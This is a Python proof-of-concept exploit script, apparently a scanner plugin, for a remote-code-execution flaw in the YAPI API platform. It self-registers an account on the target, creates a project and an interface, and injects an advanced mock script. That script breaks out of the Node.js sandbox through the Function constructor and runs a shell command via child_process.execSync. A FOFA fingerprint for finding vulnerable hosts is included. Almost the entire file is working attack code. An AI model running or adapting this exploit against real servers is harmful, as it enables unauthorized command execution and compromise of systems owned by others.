#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
import json, random, string
import re
import requests
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME = 'YAPI Mock RCE 漏洞'
AUTHOR = "境心"
REMARK = 'YAPI Mock RCE 漏洞，登录后利用'
FOFA_RULE = 'icon_hash="-715193973"'
######################################################

def genrandom(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def getversion(url):
    result = {}
    headers = {
        "User-Agent": ua
    }
    url1 = url + "/prd/assets.js"
    try:
        req1 = requests.get(url1, headers=headers, verify=False, timeout=5)
    except:
        pass
    else:
        indexjs = re.findall("{.*}", req1.text)[0]
        indexjs = json.loads(indexjs)
        verurl = url + '/prd/' + indexjs['index.js']['js']
        #################
        try:
            req2 = requests.get(verurl, headers=headers, verify=False, timeout=5)
        except:
            pass
        else:
            version = re.findall("newVersion:\"(.*)\",version", req2.text)[0]
            version = version.replace(".", "")
            if int(version) <= 192:
                result['url'] = verurl
                result['version'] = version
                result['message'] = "目标为漏洞版本，但没有注册功能"
                result['NAME'] = NAME
                return result


def retreg(url):
    result = {}
    result['url'] = url
    result['message'] = "邮箱已注册，请尝试换邮箱注册"
    result['poc'] = NAME
    return result


def poc(url):
    result = {}
    command = '"whoami"'
    headers = {
        "User-Agent": ua,
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*"
    }
    email = genrandom(7) + "@adminnn.com"
    password = genrandom(8)
    username = genrandom(5)
    data = {
        'email': email,
        'password': password,
        'username': username
    }
    # 注册
    urlp = url + "/api/user/reg"
    reqq1 = requests.post(urlp, headers=headers, data=json.dumps(data), verify=False, timeout=5)
    if reqq1.json()['errcode'] == 400:
        # 不能注册时，判断版本
        result = getversion(url)
        return result
    elif reqq1.json()['errcode'] == 401:
        if "E11000 duplicate key error" not in reqq1.json()['errmsg']:
            # 邮箱重复
            result = retreg(url)
            return result
        else:
            return None
    elif reqq1.json()['errcode'] == 0 and reqq1.json()['errmsg'] == "成功！":
        # 注册成功，获取cookies
        cookie = reqq1.cookies.get_dict()
        cookies = cookie
        # get first id
        urlid = url + "/api/group/get_mygroup"
        reqid = requests.get(urlid, headers=headers, cookies=cookies, verify=False, timeout=5)
        id = reqid.json()['data']['_id']

        # 创建项目
        urlll = url + "/api/project/add"
        data = {"name": "test", "basepath": "", "group_id": str(id), "icon": "code-o", "color": "blue",
                "project_type": "private"}
        reqxm = requests.post(urlll, headers=headers, data=json.dumps(data), cookies=cookies, verify=False, timeout=5)

        # 获取两个_id值
        _id1 = reqxm.json()['data']['_id']
        urll1 = url + "/api/project/get?id=" + str(_id1)
        reqa = requests.get(urll1, headers=headers, cookies=cookies, verify=False, timeout=5)
        _id2 = reqa.json()['data']['cat'][0]['_id']

        # 添加接口
        apiuri = genrandom(5)
        data = {"method": "GET", "catid": str(_id2), "title": "test", "path": "/" + apiuri, "project_id": _id1}
        urljk = url + "/api/interface/add"
        reqjk = requests.post(urljk, headers=headers, data=json.dumps(data), cookies=cookies, verify=False, timeout=5)

        # 用于Mock
        _id3 = reqjk.json()['data']['_id']

        # 添加高级Mock
        data = {
            "project_id": str(_id1), "interface_id": str(_id3),
            "mock_script": "const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync({_command}).toString()".format(_command=command),
            "enable": True
        }
        pocurl = url + "/api/plugin/advmock/save"
        requests.post(pocurl, headers=headers, cookies=cookies, data=json.dumps(data), verify=False, timeout=5)
        vul_url = url + "/mock/" + str(_id1) + "/" + apiuri
        r = requests.get(vul_url, headers=headers, cookies=cookies, verify=False, timeout=5)
        if "text/plain" in r.headers['Content-Type']:
            result['vul_url'] = vul_url
            result['whoami'] = r.text.strip("\r\n").strip("\n")
            result['NAME'] = NAME
            return result


if __name__ == '__main__':
    poc("http://127.0.0.1")
